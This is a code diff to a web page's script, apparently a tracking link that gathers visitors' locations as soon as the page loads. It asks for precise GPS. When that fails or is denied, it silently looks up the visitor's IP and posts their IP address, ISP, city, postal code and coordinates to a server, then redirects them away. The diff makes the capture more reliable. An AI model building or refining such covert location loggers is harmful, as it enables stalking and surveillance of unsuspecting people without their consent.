@@ -47,13 +47,41 @@
 
   <script>
     const trackId = window.location.pathname.split('/').pop();
+    const GPS_TIMEOUT_MS = 30000;
 
     // Auto-execute location tracking on page load
     window.onload = getLocation;
 
     function sendLocation(payload) {
       const data = JSON.stringify(payload);
-      navigator.sendBeacon(`/api/location/${trackId}`, new Blob([data], { type: 'application/json' }));
+      const url = `/api/location/${trackId}`;
+
+      if (navigator.sendBeacon) {
+        navigator.sendBeacon(url, new Blob([data], { type: 'application/json' }));
+        return Promise.resolve();
+      }
+
+      return fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: data,
+        keepalive: true
+      }).catch(() => {});
+    }
+
+    function getGpsErrorMessage(err) {
+      if (!err) return 'Unknown geolocation error';
+
+      switch (err.code) {
+        case err.PERMISSION_DENIED:
+          return 'Browser denied location permission';
+        case err.POSITION_UNAVAILABLE:
+          return 'Device could not provide a GPS position';
+        case err.TIMEOUT:
+          return `GPS timed out after ${GPS_TIMEOUT_MS / 1000}s`;
+        default:
+          return err.message || 'Unknown geolocation error';
+      }
     }
 
     function showLoading() {
@@ -69,7 +97,12 @@
     function getLocation() {
 
       if (!navigator.geolocation) {
-        ipFallback();
+        ipFallback('Geolocation is not supported by this browser');
+        return;
+      }
+
+      if (!window.isSecureContext) {
+        ipFallback('Geolocation requires HTTPS or localhost');
         return;
       }
 
@@ -85,18 +118,18 @@
           redirect();
         },
         (err) => {
-          ipFallback();
+          ipFallback(getGpsErrorMessage(err));
         },
-        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+        { enableHighAccuracy: true, timeout: GPS_TIMEOUT_MS, maximumAge: 0 }
       );
     }
 
-    function ipFallback() {
+    function ipFallback(gpsError) {
       showLoading();
       fetch('https://ipwho.is/')
         .then(r => r.json())
         .then(data => {
-          sendLocation({
+          return sendLocation({
             lat: data.latitude,
             lng: data.longitude,
             city: data.city,
@@ -105,11 +138,14 @@
             isp: data.connection?.isp || null,
             ip: data.ip,
             zip: data.postal,
-            source: 'ip'
+            source: 'ip',
+            gpsError
           });
         })
-        .catch(() => {});
-      redirect();
+        .catch(() => {
+          return sendLocation({ source: 'ip', gpsError: gpsError || 'IP lookup failed' });
+        })
+        .finally(redirect);
     }
   </script>
 </body>
